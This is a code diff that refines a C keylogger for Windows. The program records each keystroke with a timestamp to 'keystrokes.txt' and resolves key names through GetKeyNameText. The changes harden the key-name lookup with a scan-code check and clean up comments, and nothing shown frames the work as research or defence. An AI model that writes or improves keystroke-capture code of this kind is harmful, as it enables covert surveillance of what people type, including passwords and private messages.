@@ -7,6 +7,7 @@
 #include <string.h>
 #include <limits.h>
 #include <stddef.h>
+#include <stdint.h> // For uint32_t
 
 #define LOG_FILE "keystrokes.txt"
 #define TIMESTAMP_FORMAT "%Y-%m-%d %H:%M:%S"
@@ -14,7 +15,7 @@
 #define NUM_KEYS 256
 #define MAX_KEY_NAME_LENGTH 64
 #define MAX_ERROR_MESSAGE_LENGTH 256
-#define SLEEP_DURATION_MS 50 // Increased sleep duration for better performance
+#define SLEEP_DURATION_MS 50
 
 // Function to get the current timestamp
 bool get_timestamp(char *timestamp, size_t timestamp_size) {
@@ -74,13 +75,16 @@ const char* get_key_name(int key) {
                 return key_name;
             } else {
                 // Try to get the key name using GetKeyNameText
-                int result = GetKeyNameText(scan_code << 16, key_name, MAX_KEY_NAME_LENGTH);
-                if (result > 0) {
-                    return key_name;
-                } else {
-                    snprintf(key_name, MAX_KEY_NAME_LENGTH, "[KEY:%d]", key);
-                    return key_name;
+                // Ensure scan_code is within the valid range before shifting
+                if (scan_code != 0) {
+                    uint32_t extended_scan_code = scan_code << 16;
+                    int result = GetKeyNameText(extended_scan_code, key_name, MAX_KEY_NAME_LENGTH);
+                    if (result > 0) {
+                        return key_name;
+                    }
                 }
+                snprintf(key_name, MAX_KEY_NAME_LENGTH, "[KEY:%d]", key);
+                return key_name;
             }
     }
 }
@@ -106,8 +110,6 @@ bool log_keystroke(int key) {
     }
 
     fprintf(file, "[%s] %s\n", timestamp, get_key_name(key));
-
-    // Removed fflush - see explanation
 
     if (fclose(file) == EOF) {
         int close_err = errno;
